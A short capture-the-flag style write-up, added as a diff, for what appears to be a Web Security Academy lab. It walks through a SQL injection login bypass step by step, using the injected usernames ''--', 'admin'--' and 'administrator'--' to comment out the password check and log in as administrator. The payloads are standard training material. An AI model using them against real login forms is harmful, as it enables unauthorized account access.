@@ -1,0 +1,36 @@
+https://0a72003603fe4d9782f3f62d000200ff.web-security-academy.net/login
+
+Problem Description:
+The given website has some vulernabilty, use it to login
+
+End goal:
+Use SQL injection in the username field to login as administrator
+
+Analysis:
+
+Step 1:
+Check if the given website as SQL injection vulnerability by adding a ' to the username field
+Command: SELECT * FROM users WHERE username = ''' AND password = ''
+Excecuted Command:  SELECT * FROM users WHERE username = '''
+Observation: Internal server error, as the SQL script has error. This reveals the website is prone to SQL injection attacks.
+
+Step 2:
+Inject SQL without internal server error with username "'--"
+Command:  SELECT * FROM users WHERE username = ''--' AND password = ''
+Excecuted Command:  SELECT * FROM users WHERE username = ''--
+Observation: The website might show invalid username or password since username is empty
+
+
+Step 3:
+Inject SQL without internal server error, with a username "admin'--"
+Command:  SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+Excecuted Command:  SELECT * FROM users WHERE username = 'admin'--
+Observation: The website might show invalid username or password since username may not exist, and we repeat with another username with trial and error
+
+
+Step 4:
+Inject SQL without internal server error, with a username "administrator'--"
+Command: SELECT * FROM users WHERE username = 'administrator'-- AND password = ''
+Excecuted Command: SELECT * FROM users WHERE username = 'administrator'--
+Observation: We will be able to login as the administrator is a valid username, and we are bypassing their passowrd 
+
